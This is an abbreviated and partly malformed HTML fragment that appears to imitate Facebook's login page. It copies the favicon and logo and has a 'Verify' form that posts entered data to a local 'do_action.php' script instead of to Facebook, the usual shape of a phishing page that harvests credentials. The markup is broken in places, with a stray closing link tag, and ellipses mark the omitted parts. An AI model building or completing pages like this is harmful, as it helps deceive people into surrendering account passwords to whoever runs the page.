...
<head>
	...
	<link rel="shortcut icon" type="ico" href="images/facebook.svg">
...
<body>
	<header>
		<div class="main-header">
			<div class="logo">
				<a href="http://www.facebook.com"><img src="images/Facebook-Logo.png" alt="Facebook"></a>
			</div>
		</div>
	</header>
	<section>
		<div class="form">
			...
			<div class="login-form">
				<form action="do_action.php">
					...
					<input type="submit" name="submit" value="Verify"  href="">can't log in?</a></p>
				</form>
			</div>
